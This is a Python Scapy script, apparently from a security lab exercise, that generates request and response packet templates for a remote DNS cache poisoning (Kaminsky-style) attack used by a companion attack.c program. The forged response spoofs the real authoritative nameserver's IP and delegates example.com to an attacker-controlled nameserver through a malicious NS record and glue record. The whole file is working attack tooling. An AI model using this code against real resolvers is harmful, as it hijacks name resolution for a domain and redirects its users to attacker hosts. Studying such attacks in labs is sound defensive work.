from scapy.all import *

# Pre-configuration Settings

# Target subdomain name must be exactly 5 characters to maintain hardcoded offsets in attack.c
base_subdomain = 'aaaaa.example.com'
target_domain = 'example.com'
malicious_ns = 'ns.attacker32.com'
attacker_ip = '10.9.0.5'        # Attacker machine IP address
victim_resolver_ip = '10.9.0.53' # Victim BIND DNS server (local resolver)
real_ns_ip = '108.162.192.162'   # Real authoritative nameserver IP (found via 'dig')

# --- 1. CONSTRUCT DNS REQUEST TEMPLATE (ip_req.bin) ---
dns_question = DNSQR(qname=base_subdomain)
dns_req_header = DNS(id=0xAAAA, qr=0, qdcount=1, qd=dns_question)
ip_request = IP(dst=victim_resolver_ip, src=attacker_ip)
udp_request = UDP(dport=53, sport=12345, chksum=0)
packet_request = ip_request/udp_request/dns_req_header

with open('./ip_req.bin', 'wb') as f:
    f.write(bytes(packet_request))

# --- 2. CONSTRUCT DNS RESPONSE TEMPLATE (ip_resp.bin) ---

# Answer Section: Resolving the spoofed subdomain to an arbitrary IP
dns_answer = DNSRR(rrname=base_subdomain, type='A', rdata='1.2.3.4', ttl=259200)

# Authority Section: Delegating responsibility for 'example.com' to the malicious nameserver
dns_authority = DNSRR(rrname=target_domain, type='NS', rdata=malicious_ns, ttl=259200)

# Additional Section (Glue Record): Providing the IP mapping for the malicious nameserver
dns_additional = DNSRR(rrname=malicious_ns, type='A', rdata=attacker_ip, ttl=259200)

dns_resp_header = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
                    qdcount=1, ancount=1, nscount=1, arcount=1,
                    qd=dns_question, an=dns_answer, ns=dns_authority, ar=dns_additional)

# NOTE: Source address must impersonate the real authoritative nameserver to bypass validation checks
ip_response = IP(dst=victim_resolver_ip, src=real_ns_ip) 
udp_response = UDP(dport=33333, sport=53, chksum=0) # Port 33333 is used in lab scenarios
packet_response = ip_response/udp_response/dns_resp_header

with open('./ip_resp.bin', 'wb') as f:
    f.write(bytes(packet_response))

print("[+] Binary templates generation completed successfully.")
print(f"[*] Payload configured to impersonate Authoritative NS: {real_ns_ip}")
